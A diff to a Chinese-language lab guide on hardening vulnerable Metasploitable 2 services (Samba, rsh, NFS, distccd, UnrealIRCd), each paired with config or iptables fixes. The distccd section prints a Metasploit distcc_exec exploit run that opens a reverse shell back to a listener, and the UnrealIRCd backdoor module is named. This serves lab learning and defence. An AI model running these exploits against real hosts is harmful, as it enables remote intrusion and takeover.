@@ -1,6 +1,8 @@
 # 系统运维从修补到宕机
 3-6
 
+参考：https://metasploit.help.rapid7.com/docs/metasploitable-2-exploitability-guide
+
 ## 目录
 正在建设中
 ___
@@ -107,6 +109,30 @@ iptables -I OUTPUT -p TCP --source-port 6200 -s 0.0.0.0/0 -j DROP
 | delete | 文件名                              | 删除文件                                                     |
 | ?      | 无                                  | 查看能使用的命令                                             |
 
+###  samba
+
+提供跨平台文件共享服务
+
+端口：TCP139 445
+
+配置文件：/etc/samba/smb.comf
+
+加固：修改配置文件
+
+```conf
+[共享名称]
+	guest ok = yes/no #是否允许匿名账户访问本共享
+	security = user/share #基于samba账号验证还是不需要账号验证
+	path = 此共享的共享目录绝对路径
+	read only = yes/no #是否只读
+	writable = yes/no #是否可写
+	public = yes/no #是否公开此共享
+```
+
+
+
+
+
 ### rexec rlogin rsh
 
 提供远程登录服务
@@ -151,7 +177,7 @@ $ sudo apt-get install rsh-client
 - -
 ```
 
-###　NFS(Network File System)
+### NFS(Network File System)
 
 提供远程访问文件系统服务
 
@@ -264,9 +290,43 @@ root
 iptables -I INPUT -p TCP --destination-port 1524
 ```
 
+### distccd
+
+后门程序，提供远程命令执行
+
+端口：3632
+
+利用：
+
+```
+msf5 exploit(unix/misc/distcc_exec) > exploit 
+
+[*] Started reverse TCP double handler on 192.168.247.1:4444 
+[*] Accepted the first client connection...
+[*] Accepted the second client connection...
+[*] Command: echo 1Og0JD4yJXeNmyX6;
+[*] Writing to socket A
+[*] Writing to socket B
+[*] Reading from sockets...
+[*] Reading from socket B
+[*] B: "1Og0JD4yJXeNmyX6\r\n"
+[*] Matching...
+[*] A is input...
+[*] Command shell session 2 opened (192.168.247.1:4444 -> 192.168.247.250:44246) at 2019-03-07 15:29:09 +0800
+```
+
+加固：
+
+```
+封堵端口
+# iptables -I INPUT -p TCP --destination-port 3632 -j DROP
+```
+
 
 
 ### UnreaIRCD IRC
+
+v3.2.8.1 存在后门，提供root shell连接
 
 ```
 exploit/unix/irc/unreal_ircd_3281_backdoor UnrealIRCD 3.2.8.1 Backdoor Command Execution
@@ -308,7 +368,9 @@ root
 
 
 
- 
+ ###  iptables使用
+
+![](imgs/iptables_usage.png)
 
 
 
